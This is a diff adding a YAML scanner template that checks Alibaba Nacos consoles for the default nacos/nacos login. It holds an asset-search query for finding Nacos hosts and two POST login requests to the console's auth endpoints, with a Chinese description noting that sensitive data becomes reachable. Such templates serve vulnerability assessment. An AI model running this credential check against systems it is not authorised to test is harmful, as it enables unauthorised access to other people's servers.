@@ -1,0 +1,29 @@
+name: Alibaba Nacos 控制台默认弱口令
+manual: true
+query: '(title="Nacos" || title="HTTP Status 404 – Not Found" || port="8848") '
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /nacos/v1/auth/users/login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=nacos&password=nacos
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: /v1/auth/users/login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=nacos&password=nacos
+      follow_redirects: true
+    expression: response.status == 200
+expression: r0() || r1()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Alibaba Nacos 控制台存在默认弱口令 nacos/nacos，可登录后台查看敏感信息
+  tags: 弱口令
